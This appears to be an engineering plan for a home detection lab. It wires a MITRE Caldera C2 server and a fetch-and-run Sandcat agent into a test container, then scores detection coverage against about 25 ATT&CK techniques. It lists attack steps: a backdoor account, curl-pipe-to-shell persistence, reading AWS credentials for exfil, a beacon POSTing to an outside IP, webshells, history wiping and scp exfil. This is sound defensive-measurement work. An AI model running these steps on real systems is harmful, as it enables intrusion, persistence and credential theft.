# Phase 21 — MITRE Caldera adversary emulation + coverage scorecard

**Branch:** `phase-21-caldera-emulation` off `main` (commit `11778e3`, currently `v1.0`)
**ADR:** `docs/decisions/ADR-0016-caldera-emulation.md` (next free slot — ADR-0015 is merge/split)
**Workstream pattern:** A/B/C/D, mirroring Phase 20.

---

## Context — why this phase, why now

Phase 20 shipped a hand-curated detection-gap list (4 evidenced gaps in `docs/phase-20-summary.md:36-148`). It was authored by *reading* the scenarios — useful, but not measured. Before designing Phase 22 detectors ("intent over tool name"), we need to **measure** coverage systematically against an ATT&CK-mapped adversary, so the Phase 22 punch list is data-driven, not author-driven.

**The deliverable:** a markdown + JSON scorecard at `docs/phase-21-scorecard.md|json` produced by running ~25 curated MITRE Caldera abilities (Linux, mapped to ATT&CK techniques our Phase 20 scenarios already touch) against `lab-debian`, then reading CyberCat's `detections` table to see what fired. **The brutal-looking coverage number IS the deliverable** — projected ~2-3 covered out of 25 (~8-12%). That number becomes Phase 22's input list, ordered by evidence weight rather than guesswork.

**Design choices (operator-confirmed during planning):**
1. Caldera runs as a new compose service `caldera`, gated by `--profile caldera` (default OFF, like Wazuh). Sandcat (Caldera's Linux agent) auto-fetches into `lab-debian` when the profile is up.
2. Curated ~25 abilities covering T1078, T1059.004, T1057, T1018, T1003.008, T1083, T1071.001, T1105, T1486, T1110.001, T1021.004, T1546, T1505.003, T1098, T1552.001, T1070.003, T1560.001, T1048.002, T1543.002, T1082.

---

## Workstream A — Caldera service + Sandcat in `lab-debian`

**Goal:** Add the Caldera C2 server as a profile-gated compose service (idle off, host-port bound to 127.0.0.1 only per CLAUDE.md §8), and modify `lab-debian` to fetch + run Sandcat when `CALDERA_URL` is set.

### A.1 Files to create

- `infra/caldera/Dockerfile` — thin wrapper image we own. Pins Caldera to a known-good tag (recommended: `5.0.0`). Built only when `--profile caldera` is active.
- `infra/caldera/local.yml` — Caldera server config. Sets `host: 0.0.0.0`, `port: 8888`, locks plugin set to the curated subset (stockpile, sandcat, training, manx).
- `infra/caldera/.gitignore` — ignore the cloned `caldera/` source tree if anyone runs `docker build` outside Docker.

### A.2 Files to modify

- `infra/compose/docker-compose.yml` — add the `caldera` service block + extend `lab-debian.environment` with `CALDERA_URL`/`CALDERA_GROUP` + add `caldera_data` named volume.
- `infra/lab-debian/Dockerfile` — append a small block that creates `/opt/sandcat` (binary fetched at runtime, not baked, so the image stays decoupled from Caldera's release cadence).
- `infra/lab-debian/entrypoint.sh` — insert a Sandcat-on-env-var startup block, mirroring the existing Wazuh `WAZUH_MANAGER` conditional.
- `start.sh` — add a `caldera_profile_active()` helper (mirrors `agent_profile_active()` at `start.sh:60-65`) and a `CALDERA_API_KEY` provisioning branch (mirrors the `CCT_AGENT_TOKEN` block at `start.sh:105-166`).
- `infra/compose/.env.example` — append the three new env vars with placeholders.

### A.3 Concrete YAML — append to `infra/compose/docker-compose.yml`

Insert after the `cct-agent` service block (after line 232) and before the `volumes:` section (line 234):

```yaml
  # ── Tier D: Caldera adversary emulation (--profile caldera) ──────────────
  # MITRE Caldera C2 server for ATT&CK-mapped adversary emulation against
  # lab-debian. Default OFF; only runs with --profile caldera. See
  # docs/decisions/ADR-0016-caldera-emulation.md.
  #
  # Bound to 127.0.0.1 only (CLAUDE.md §8 host-safety): the UI is reachable
  # by the operator on the laptop and by no one else.
  caldera:
    build:
      context: ../caldera
      dockerfile: Dockerfile
    profiles: [caldera]
    hostname: caldera
    environment:
      CALDERA_API_KEY: ${CALDERA_API_KEY:-CYBERCAT_DEV_KEY_DO_NOT_SHIP}
    ports:
      - "127.0.0.1:8888:8888"
    volumes:
      - caldera_data:/usr/src/app/data
    healthcheck:
      test: ["CMD-SHELL", "curl -sf http://localhost:8888/api/v2/health || exit 1"]
      interval: 15s
      timeout: 10s
      retries: 20
      start_period: 60s
    restart: unless-stopped
```

Then **add to** the existing `lab-debian.environment` block, append after the `WAZUH_REGISTRATION_PASSWORD` line:

```yaml
      - CALDERA_URL=${CALDERA_URL:-}
      - CALDERA_GROUP=${CALDERA_GROUP:-red}
```

Then **add to** the `volumes:` block at the bottom:

```yaml
  caldera_data:
```

### A.4 `infra/caldera/Dockerfile` (full file)

```dockerfile
# CyberCat: Caldera adversary-emulation server, pinned.
# Built only when --profile caldera is active. See ADR-0016.
FROM python:3.11-slim

ARG CALDERA_VERSION=5.0.0

RUN apt-get update && apt-get install -y --no-install-recommends \
        git curl ca-certificates build-essential \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /usr/src/app
RUN git clone --depth 1 --branch "${CALDERA_VERSION}" --recurse-submodules \
        https://github.com/mitre/caldera.git . \
    && pip install --no-cache-dir -r requirements.txt

COPY local.yml conf/local.yml

EXPOSE 8888
CMD ["python3", "server.py", "--insecure"]
```

`--insecure` is acceptable because (a) we expose only on `127.0.0.1`, (b) the server runs on the private compose bridge, (c) the operator's threat model is a laptop lab. ADR-0016 states this explicitly.

### A.5 `infra/lab-debian/Dockerfile` diff

Insert after the Wazuh-agent install block (after line 22) and before the user-seed block (line 25):

```dockerfile
# Phase 21: prepare Sandcat (Caldera's Linux agent) work directory.
# Binary is fetched at container start by entrypoint.sh from the Caldera
# server when CALDERA_URL is set. Fetch-on-start matches Caldera's own
# Linux enrollment docs and keeps this image decoupled from Caldera's
# release cadence.
RUN mkdir -p /opt/sandcat && chmod 755 /opt/sandcat
```

### A.6 `infra/lab-debian/entrypoint.sh` diff

Insert between line 46 (`service wazuh-agent start ...`) and line 48 (`# Run sshd in foreground as PID 1`):

```bash
# Phase 21: launch Sandcat (Caldera's Linux agent) when CALDERA_URL is set.
# Mirrors the WAZUH_MANAGER conditional pattern above. Sandcat is fetched
# at runtime from the Caldera server's /file/download endpoint with the
# platform/architecture/group selected via headers.
if [ -n "$CALDERA_URL" ]; then
    SANDCAT_GROUP="${CALDERA_GROUP:-red}"
    if [ ! -x /opt/sandcat/sandcat ]; then
        curl -sk -X POST \
             -H "file:sandcat.go" \
             -H "platform:linux" \
             -H "gocat-version:5.0.0" \
             -o /opt/sandcat/sandcat \
             "${CALDERA_URL}/file/download" 2>/dev/null \
            && chmod +x /opt/sandcat/sandcat
    fi
    if [ -x /opt/sandcat/sandcat ]; then
        ( /opt/sandcat/sandcat -server "${CALDERA_URL}" \
                               -group "${SANDCAT_GROUP}" \
                               -v >> /var/log/sandcat.log 2>&1 & ) || true
    fi
fi
```

**Why `( ... & ) || true` and `2>/dev/null`:** matches the conntrack pattern at `entrypoint.sh:22`. A missing/unreachable Caldera (the common case when `--profile caldera` is OFF) **must not abort sshd startup**. The fetch is best-effort and idempotent across container restarts.

### A.7 `start.sh` additions

Add a helper near `agent_profile_active()` at line 60-65:

```bash
caldera_profile_active() {
  for p in "${PROFILES[@]}"; do
    if [ "$p" = "caldera" ]; then return 0; fi
  done
  return 1
}
```

Then after the `CCT_AGENT_TOKEN` block ends (line 166), add a parallel branch:

```bash
# ----------------------------------------------------------------------------
# First-run Caldera API key bootstrap (only if --profile caldera is active)
# ----------------------------------------------------------------------------
if caldera_profile_active; then
  current_key=""
  if [ -f "$ENV_FILE" ]; then
    current_key=$(grep "^CALDERA_API_KEY=" "$ENV_FILE" 2>/dev/null | head -1 | sed 's/^CALDERA_API_KEY=//')
  fi
  if [ -z "$current_key" ] || [ "$current_key" = "CYBERCAT_DEV_KEY_DO_NOT_SHIP" ]; then
    echo "First-run: generating CALDERA_API_KEY..."
    new_key=$(openssl rand -hex 16 2>/dev/null || head -c 32 /dev/urandom | base64 | head -c 32)
    if grep -q "^CALDERA_API_KEY=" "$ENV_FILE" 2>/dev/null; then
      sed -i.bak "s|^CALDERA_API_KEY=.*|CALDERA_API_KEY=$new_key|" "$ENV_FILE"
      rm -f "${ENV_FILE}.bak"
    else
      echo "CALDERA_API_KEY=$new_key" >> "$ENV_FILE"
    fi
    echo "✓ CALDERA_API_KEY written to $ENV_FILE"
    docker compose -f "$COMPOSE_FILE" "${PROFILE_FLAGS[@]}" up -d --force-recreate caldera
  fi
fi
```

### A.8 `infra/compose/.env.example` additions

```dotenv
# Phase 21 — Caldera adversary emulation (only used with --profile caldera)
# Auto-provisioned by start.sh on first --profile caldera up.
CALDERA_API_KEY=
CALDERA_URL=http://caldera:8888
CALDERA_GROUP=red
```

### A.9 Verification

```bash
docker compose -f infra/compose/docker-compose.yml --profile agent --profile caldera up -d --build
sleep 60   # let Caldera's start_period run
curl -sf http://127.0.0.1:8888/api/v2/health
docker compose -f infra/compose/docker-compose.yml exec lab-debian pgrep -af sandcat
```

**Expected:** healthcheck returns 200; pgrep shows a `sandcat -server http://caldera:8888 -group red` process.

---

## Workstream B — Ability profile + run orchestrator + scorer

### B.1 New directory layout

```
labs/caldera/
├── README.md                        # Operator-facing: how to run, what gets produced.
├── profile.yml                      # Adversary profile — list of ability IDs in order.
├── abilities/                       # Custom abilities for techniques Stockpile lacks.
│   ├── linux_lateral_ssh.yml        # T1021.004 — sshd→bash→ssh chain
│   ├── linux_curl_pipe_sh.yml       # T1105 — curl|sh persistence
│   ├── linux_file_burst_encrypt.yml # T1486 — 30× rename .encrypted in 60s
│   ├── linux_creds_aws_read.yml     # T1552.001 — read ~/.aws/credentials, exfil
│   └── linux_useradd_persist.yml    # T1098 — useradd backdoor account
├── expectations.yml                 # Source of truth: ability → technique → expected rule_id.
├── build_operation_request.py       # Helper: assemble Caldera /api/v2/operations payload.
├── run.sh                           # Orchestrator. Bash, mirrors labs/drills/run.sh shape.
└── scorer.py                        # Reads expectations + Caldera report + CyberCat dets.
```

### B.2 Curated ability set (the ~25, scored pre-run by author)

| # | Ability | Technique | Source | Expected `rule_id` | Pre-run status |
|---|---|---|---|---|---|
| 1 | bash recon: `id` | T1059.004 | Stockpile | — | gap |
| 2 | bash recon: `whoami` | T1059.004 | Stockpile | — | gap |
| 3 | process listing: `ps -ef` | T1057 | Stockpile | — | gap |
| 4 | hosts read: `cat /etc/hosts` | T1018 | Stockpile | — | gap |
| 5 | passwd read: `cat /etc/passwd` | T1003.008 | Stockpile | — | gap |
| 6 | dir enum: `find /home -name "*.pdf"` | T1083 | Stockpile | — | gap |
| 7 | bash → ssh pivot | T1021.004 | custom | — | gap |
| 8 | curl \| sh persistence | T1105 | custom | — | gap |
| 9 | http beacon: `curl -X POST http://198.51.100.77/...` | T1071.001 | Stockpile | `py.blocked_observable_match` (if pre-seeded) | partial |
| 10 | brute-force ssh: 5× wrong password | T1110.001 | Stockpile | `py.auth.failed_burst` | covered |
| 11 | success after brute-force from new IP | T1078 | follow-up to #10 | `py.auth.anomalous_source_success` | covered |
| 12 | clean cred-theft success (no prior failures) | T1078 | custom | — | gap (Gap 3) |
| 13 | aws creds read: `cat ~/.aws/credentials` | T1552.001 | custom (same YAML as 12) | — | gap |
| 14 | encryption burst: 30× rename `.encrypted` | T1486 | custom | — | gap (Gap 4) |
| 15 | useradd: `useradd -m -s /bin/bash backdoor` | T1098 | custom | — | gap |
| 16 | cron persistence: write `/etc/cron.d/...` | T1546.003 | Stockpile | — | gap |
| 17 | webshell drop: write `/var/www/.../shell.php` | T1505.003 | Stockpile | — | gap |
| 18 | webshell whoami via apache2→sh→id | T1059.004 | Stockpile | — | gap |
| 19 | sudoers read: `cat /etc/sudoers` | T1003.008 | Stockpile | — | gap |
| 20 | bash history wipe: `> ~/.bash_history` | T1070.003 | Stockpile | — | gap |
| 21 | tarball stage: `tar czf /tmp/loot.tar.gz` | T1560.001 | Stockpile | — | gap |
| 22 | scp exfil | T1048.002 | Stockpile | — | gap |
| 23 | systemd persistence: write a `.service` | T1543.002 | Stockpile | — | gap |
| 24 | password change: `passwd realuser` | T1098 | Stockpile | — | gap |
| 25 | host enumeration: `uname -a; hostnamectl` | T1082 | Stockpile | — | gap |

**Pre-run projection:** 2 covered + 1 partial + 22 gap = ~12% coverage. The deliverable is whatever the run actually produces; surprises in either direction warrant investigation before merging.

### B.3 `expectations.yml` schema

See the file itself for the full registry. Each entry has: `id`, `name`, `technique`, `expected_rule_id` (or `GAP`), `status` (covered/partial/gap), `notes`.

### B.4 Custom ability YAML — example: `abilities/linux_file_burst_encrypt.yml`

```yaml
- id: linux_file_burst_encrypt
  name: File-burst rename (ransomware-shape)
  description: |
    Stages 30 dummy files in /tmp/loot/ and renames each to <name>.encrypted
    over a ~60-second window. Models the volumetric file-creation signature
    a real ransomware loader leaves. Phase 21 expects no detection (Gap 4);
    Phase 22 will add a file-burst detector.
  tactic: impact
  technique:
    attack_id: T1486
    name: Data Encrypted for Impact
  platforms:
    linux:
      sh:
        command: |
          mkdir -p /tmp/loot
          for i in $(seq 1 30); do
              touch "/tmp/loot/f${i}.txt"
              mv "/tmp/loot/f${i}.txt" "/tmp/loot/f${i}.txt.encrypted"
              sleep 2
          done
        cleanup: |
          rm -rf /tmp/loot
```

The other four custom abilities follow the same structure. Each `cleanup` block is required so the lab returns to baseline between runs.

### B.5 `profile.yml` — adversary profile

Top-level dict: `name`, `description`, `atomic_ordering` (list of ability IDs in execution order). Stockpile UUIDs are resolved at run time by `build_operation_request.py --resolve-uuids` against `/api/v2/abilities`.

### B.6 `build_operation_request.py`

Pure-stdlib helper that:
1. Reads `profile.yml` + `expectations.yml`.
2. Resolves Stockpile UUIDs (idempotent — caches into a `.resolved.json` sidecar).
3. POSTs the adversary to `/api/v2/adversaries` (idempotent — checks existence first).
4. Looks up the `atomic` planner's GUID from `/api/v2/planners`.
5. Confirms ≥1 agent in the `red` group from `/api/v2/agents`.
6. Returns the fully-formed JSON body for `POST /api/v2/operations`.

### B.7 `run.sh` — orchestrator (~120 lines)

Mirrors `labs/drills/run.sh` shape. Does: preflight → build payload → start operation → poll to completion → pull report + detections → invoke scorer. Supports `--single-ability <id>` and `--no-score` flags for the smoke test.

### B.8 `scorer.py` — coverage logic (~150 lines)

Six-status enum: covered / gap / false-negative / unexpected-hit / ability-failed / ability-skipped. Conservative attribution: a rule fire is attributed to an ability iff any detection's `attack_tags` overlaps the ability's `technique` (or its parent). Renders both markdown and JSON output.

### B.9 Verification

```bash
bash labs/caldera/run.sh
ls -la docs/phase-21-scorecard.md docs/phase-21-scorecard.json
head -20 docs/phase-21-scorecard.md
```

**Expected:** both files exist; markdown summary line shows `covered ~2-3 / 25`.

---

## Workstream C — Backend coverage endpoint (DEFERRED)

**Decision: defer to Phase 21.5 or later. Phase 21 ships scorecard-as-files-only.**

Rationale (also recorded in `PROJECT_STATE.md` Open Questions and ADR-0016 §"What we're not doing yet"):
- The data model an endpoint would expose duplicates `expectations.yml` + Caldera's operation report.
- New schema for a v1 audience of one operator reading markdown is overshoot.
- Scoring is deterministic — re-run the scorer to regenerate.
- Phase 22's punch list needs the markdown, not an API surface.

---

## Workstream D — Smoke test + docs + ADR

### D.1 Files to create

- `labs/smoke_test_phase21.sh` — assertion harness mirroring `labs/smoke_test_phase20.sh`.
- `docs/phase-21-summary.md` — written at close-out with the first scorecard run + ordered Phase 22 punch list.
- `docs/decisions/ADR-0016-caldera-emulation.md`.
- Memory entry `project_phase21.md` (in `~/.claude/projects/.../memory/`).

### D.2 Files to modify

- `PROJECT_STATE.md` — rewrite "Pick up next session" header at close.
- `docs/runbook.md` — new section "Running the coverage scorecard".
- `docs/learning-notes.md` — four new entries:
  - "MITRE Caldera adversary emulation"
  - "Sandcat (Caldera Linux agent) — fetch-on-start enrollment pattern"
  - "Coverage scorecard methodology — covered/gap/false-negative/unexpected-hit"
  - "ATT&CK technique attribution — `attack_tags` overlap as the conservative rule"

### D.3 `labs/smoke_test_phase21.sh` — five assertions

T1. caldera service healthy under `--profile caldera`.
T2. sandcat process running in lab-debian.
T3. Caldera API sees ≥1 agent in the 'red' group.
T4. A canned single-ability run (T1110.001 brute-force) fires `py.auth.failed_burst`.
T5. `labs/caldera/run.sh` produces both scorecard files.

### D.4 ADR-0016 — see the file itself for the full text.

### D.5 Memory entry plan (added at close)

`project_phase21.md` matches the Phase 16/17/18/19/20 entry shape: shipped, headline scorecard number, ordered Phase 22 punch list with file paths.

### D.6 Verification

```bash
bash labs/smoke_test_phase21.sh
```

**Expected:** `passed: 5  failed: 0`.

---

## Phase 21 — operator's end-to-end checklist

```bash
# 1. Branch + initial bring-up.
git checkout -b phase-21-caldera-emulation
bash start.sh --profile agent --profile caldera

# 2. Confirm Caldera + Sandcat alive.
sleep 60
curl -sf http://127.0.0.1:8888/api/v2/health
docker compose -f infra/compose/docker-compose.yml exec lab-debian pgrep -af sandcat

# 3. Run the curated profile and produce the scorecard.
bash labs/caldera/run.sh

# 4. Read the result.
less docs/phase-21-scorecard.md

# 5. Smoke green.
bash labs/smoke_test_phase21.sh

# 6. Backend lint (Phase 20 CI-red lesson).
MSYS_NO_PATHCONV=1 docker run --rm \
    -v "/c/Users/oziel/OneDrive/Desktop/CyberCat/backend:/work" \
    -w /work python:3.12-slim \
    bash -c "pip install ruff --quiet && ruff check app/"

# 7. Backend pytest still green.
docker compose -f infra/compose/docker-compose.yml exec backend pytest -q
```

All seven must pass before merging into `main` and tagging.

---

## Risks / open questions

1. **Caldera tag pinning.** Pinned `CALDERA_VERSION=5.0.0`. If 5.0.0 doesn't build cleanly with our Dockerfile, fall back to `4.2.0` and document in ADR-0016.

2. **`/v1/detections?since=` filter.** Verify at `backend/app/api/routers/detections.py:31-111` that the route accepts `since=<iso8601>`. If not, add a one-line `Query(default=None)` + `WHERE created_at >= since` clause.

3. **Sandcat enrollment race.** With both profiles brought up simultaneously, lab-debian may try to fetch Sandcat before Caldera's `start_period` elapses. Entrypoint's `|| true` handles graceful failure; smoke test waits ~60s before asserting.

4. **Stockpile UUID resolution.** Run `python3 build_operation_request.py --resolve-uuids` once after first bring-up to write resolved IDs into `expectations.resolved.yml`.

5. **Resource ceiling.** WSL2 cap is ~6 GB. Always-on stack idles ~2 GB; Caldera adds ~1.0–1.5 GB. With `--profile wazuh` simultaneously active that pushes us close to the wall — never run all three profiles together unless `~/.wslconfig` is bumped to 8 GB.

6. **First-run scorecard headline.** Projection: 2-3 covered out of 25. If much higher, attribution may be too loose. If much lower, `py.auth.failed_burst` may have a brittle parse path under Caldera-driven sshd traffic.

7. **Caldera UI authentication.** With `--insecure`, anyone with access to `127.0.0.1:8888` on the laptop can drive the Caldera UI. Acceptable per laptop-lab threat model. **If the operator ever runs CyberCat on a shared/multi-user machine, this assumption inverts** and `--insecure` must be removed.

8. **Cleanup discipline.** Every custom ability YAML MUST include a `cleanup` block. Without it, lab-debian accumulates artifacts across runs and the scorecard becomes non-reproducible.

---

## Workstream sequencing

1. **Workstream A** → commit `phase-21 A: caldera service + sandcat in lab-debian`. Verify with A.9.
2. **Workstream B1** (ability YAMLs + profile + expectations) → commit `phase-21 B1: ability profile + expectations`.
3. **Workstream B2** (orchestrator + scorer) → commit `phase-21 B2: run.sh + scorer.py`. Verify with B.9.
4. **Workstream D1** (smoke test) → commit `phase-21 D1: smoke_test_phase21.sh`. Verify with D.6.
5. **Workstream D2** (docs + ADR + memory) → commit `phase-21 D2: ADR-0016 + docs + summary`.
6. Run the operator's full 7-step checklist. Fix any ruff/pytest reds with a `phase-21 D3: ruff` commit if needed.
7. Merge `--no-ff` into `main` with `Phase 21 — Caldera adversary emulation + coverage scorecard`.
8. Optional `v1.1` tag.
